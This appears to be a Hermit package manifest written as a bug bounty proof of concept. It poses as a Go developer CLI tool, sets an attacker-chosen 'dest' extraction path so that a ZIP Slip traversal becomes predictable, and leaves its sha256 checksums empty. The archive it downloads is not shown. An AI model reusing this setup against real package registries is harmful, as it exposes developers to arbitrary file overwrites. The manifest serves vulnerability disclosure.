description = "Awesome Dev Tool - Fast CLI utility for Go developers (Bug Bounty PoC)"
homepage = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing"
binaries = ["awesome-devtool"]

// 🔴 ATTACKER CONTROLS DESTINATION via "dest" field!
// This makes the ZIP Slip path PREDICTABLE — no hash guessing needed
dest = "/tmp/hermit-awesome-poc"

source = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v${version}/awesome-devtool-${version}-${os}-${arch}.tar.gz"

version "1.0.0" {
}

sha256sums = {
  "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-1.0.0-linux-amd64.tar.gz": "",
  "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-1.0.0-darwin-amd64.tar.gz": "",
  "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-1.0.0-darwin-arm64.tar.gz": "",
}
